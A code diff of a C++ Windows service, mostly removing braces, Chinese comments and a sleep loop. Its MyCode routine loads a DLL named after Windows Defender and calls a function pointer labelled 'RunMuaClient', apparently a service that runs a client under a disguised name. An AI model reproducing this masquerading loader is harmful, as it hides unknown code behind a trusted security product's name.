@@ -22,7 +22,7 @@ int wmain(int argc, wchar_t* argv[])
 {
 	// 注册服务入口函数
 	SERVICE_TABLE_ENTRY stDispatchTable[] = { { g_szServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain }, { NULL, NULL } };
-	::StartServiceCtrlDispatcher(stDispatchTable);
+	StartServiceCtrlDispatcher(stDispatchTable);
 
 	return 0;
 }
@@ -51,31 +51,23 @@ void WINAPI ServiceCtrlHandle(DWORD dwOperateCode) {
 	switch (dwOperateCode)
 	{
 	case SERVICE_CONTROL_PAUSE:
-	{
-		// 暂停
 		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
 		TellSCM(SERVICE_PAUSED, 0, 0);
 		break;
-	}
+
 	case SERVICE_CONTROL_CONTINUE:
-	{
-		// 继续
 		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
 		TellSCM(SERVICE_RUNNING, 0, 0);
 		break;
-	}
+
 	case SERVICE_CONTROL_STOP:
-	{
-		// 停止
 		TellSCM(SERVICE_STOP_PENDING, 0, 1);
 		TellSCM(SERVICE_STOPPED, 0, 0);
 		break;
-	}
+
 	case SERVICE_CONTROL_INTERROGATE:
-	{
-		// 询问
 		break;
-	}
+
 	default:
 		break;
 	}
@@ -103,8 +95,4 @@ void MyCode() {
 	HINSTANCE  hDll = LoadLibrary(L"WindowsDefenderAutoUpdate.dll");
 	FUNC pfnRunMuaClient = (FUNC)GetProcAddress(hDll, "WindowsDefenderAutoUpdate");
 	pfnRunMuaClient();
-	
-	while (TRUE) {
-		Sleep(5000);
-	}
 }
